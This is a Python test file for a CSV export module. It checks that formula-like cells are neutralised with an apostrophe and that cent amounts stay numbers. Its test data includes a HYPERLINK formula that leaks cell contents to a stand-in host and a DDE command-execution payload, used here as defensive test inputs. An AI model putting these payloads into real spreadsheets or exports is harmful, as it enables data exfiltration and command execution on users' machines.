"""Exports CSV : pas d'injection de formule dans un tableur, montants restés des nombres."""

import csv
import io

import pytest
from hypothesis import given
from hypothesis import strategies as st

from app.spreadsheet import BOM, CHUNK_CHARS, FORMULA_STARTS, cell, csv_lines, text_cell


@pytest.mark.parametrize(
    "dangerous",
    [
        '=HYPERLINK("https://pirate.example/?"&A1;"clic")',
        "+cmd|' /C calc'!A0",
        "-2+3",
        "@SUM(A1:A9)",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_formula_like_text_is_neutralised(dangerous: str) -> None:
    assert text_cell(dangerous) == "'" + dangerous


@given(st.text())
def test_text_never_starts_a_formula(text: str) -> None:
    neutral = cell(text)
    assert not neutral.startswith(FORMULA_STARTS)
    assert neutral in (text, "'" + text)


def test_amounts_stay_numbers() -> None:
    assert [cell(-1_234_56), cell(5), cell("CB CARREFOUR")] == ["-1234,56", "0,05", "CB CARREFOUR"]
    with pytest.raises(TypeError):
        cell(True)


def test_csv_lines_round_trip() -> None:
    text = "".join(csv_lines([["Libellé", "Montant"], ["=1+1; « ok »", -80_00]]))
    assert text.startswith(BOM)
    rows = list(csv.reader(io.StringIO(text.removeprefix(BOM)), delimiter=";"))
    assert rows == [["Libellé", "Montant"], ["'=1+1; « ok »", "-80,00"]]


def test_large_exports_are_sent_in_a_few_blocks() -> None:
    rows: list[list[str | int]] = [[f"CB COMMERCE {n}", -n] for n in range(20_000)]
    blocks = list(csv_lines(rows))
    assert 2 < len(blocks) < 20  # par blocs d'environ 64 Ko, pas une ligne à la fois
    assert all(len(block) <= CHUNK_CHARS + 200 for block in blocks)
    text = "".join(blocks)
    assert text.startswith(BOM) and text.count("\n") == 20_000
